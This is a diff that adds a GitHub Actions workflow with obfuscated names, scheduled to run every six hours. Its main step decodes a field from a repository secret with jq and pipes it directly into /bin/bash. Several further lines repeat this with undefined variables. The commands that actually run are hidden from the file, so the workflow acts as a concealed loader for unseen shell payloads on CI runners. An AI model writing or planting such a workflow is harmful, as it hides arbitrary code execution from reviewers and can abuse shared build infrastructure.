@@ -1,0 +1,25 @@
+name: transhipafford
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: transhipafford
+        env:
+          vy2469: ${{ secrets.vy2469 }}
+        run: |
+          echo $vy2469 | jq -r .dipb41507 | /bin/bash
+          echo $vcqtg2 | jq -r .ut496 | /bin/bash
+          echo $c512 | jq -r .g7021 | /bin/bash
+          echo $quldl38578 | jq -r .klxb20725 | /bin/bash
+          echo $ypi1751 | jq -r .uyy0 | /bin/bash
+          echo $zx16 | jq -r .ky4 | /bin/bash
+          echo $yy63 | jq -r .kyk4944 | /bin/bash
+          echo $shu5399 | jq -r .b20 | /bin/bash
+
